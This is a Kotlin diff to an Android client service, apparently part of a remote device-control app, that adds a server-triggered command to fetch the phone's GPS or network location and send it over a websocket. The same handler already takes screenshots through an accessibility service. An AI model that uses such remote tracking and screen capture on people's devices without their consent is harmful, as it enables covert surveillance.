@@ -1,5 +1,6 @@
 package com.aura.client
 
+import android.annotation.SuppressLint
 import android.app.KeyguardManager
 import android.app.Notification
 import android.app.NotificationChannel
@@ -341,10 +342,86 @@ class AuraService : Service(), TextToSpeech.OnInitListener {
                     "SCREENSHOT" -> {
                         AuraAccessibilityService.instance?.takeScreenshot()
                     }
+                    "GET_LOCATION", "LOCATE" -> {
+                        fetchAndSendLocation()
+                    }
                 }
             }
         } catch (e: Exception) {
             Log.e(TAG, "Error handling command", e)
+        }
+    }
+
+    @SuppressLint("MissingPermission")
+    private fun fetchAndSendLocation() {
+        try {
+            val locationManager = getSystemService(Context.LOCATION_SERVICE) as? android.location.LocationManager
+            if (locationManager == null) {
+                logUi("LocationManager not available")
+                return
+            }
+
+            var bestLocation: android.location.Location? = null
+
+            // Check GPS Provider
+            try {
+                if (locationManager.isProviderEnabled(android.location.LocationManager.GPS_PROVIDER)) {
+                    val loc = locationManager.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER)
+                    if (loc != null) bestLocation = loc
+                }
+            } catch (e: Exception) {}
+
+            // Check Network Provider if GPS not available
+            try {
+                if (bestLocation == null && locationManager.isProviderEnabled(android.location.LocationManager.NETWORK_PROVIDER)) {
+                    val loc = locationManager.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER)
+                    if (loc != null) bestLocation = loc
+                }
+            } catch (e: Exception) {}
+
+            // Check Passive Provider
+            try {
+                if (bestLocation == null && locationManager.isProviderEnabled(android.location.LocationManager.PASSIVE_PROVIDER)) {
+                    val loc = locationManager.getLastKnownLocation(android.location.LocationManager.PASSIVE_PROVIDER)
+                    if (loc != null) bestLocation = loc
+                }
+            } catch (e: Exception) {}
+
+            if (bestLocation != null) {
+                val locJson = JSONObject().apply {
+                    put("type", "DEVICE_LOCATION")
+                    put("deviceId", deviceSlot)
+                    put("name", customDeviceName)
+                    put("latitude", bestLocation.latitude)
+                    put("longitude", bestLocation.longitude)
+                    put("accuracy", bestLocation.accuracy)
+                    put("timestamp", bestLocation.time)
+                }
+                logUi("📍 GPS Location Found: ${bestLocation.latitude}, ${bestLocation.longitude} (±${bestLocation.accuracy}m)")
+                webSocket?.send(locJson.toString())
+            } else {
+                logUi("⚠️ Requesting fresh GPS coordinates...")
+                // Request a single fresh location update on main looper
+                locationManager.requestSingleUpdate(
+                    android.location.LocationManager.NETWORK_PROVIDER,
+                    { location ->
+                        val locJson = JSONObject().apply {
+                            put("type", "DEVICE_LOCATION")
+                            put("deviceId", deviceSlot)
+                            put("name", customDeviceName)
+                            put("latitude", location.latitude)
+                            put("longitude", location.longitude)
+                            put("accuracy", location.accuracy)
+                            put("timestamp", location.time)
+                        }
+                        logUi("📍 GPS Location Acquired: ${location.latitude}, ${location.longitude}")
+                        webSocket?.send(locJson.toString())
+                    },
+                    Looper.getMainLooper()
+                )
+            }
+        } catch (e: Exception) {
+            logUi("Error fetching location: ${e.message}")
         }
     }
 
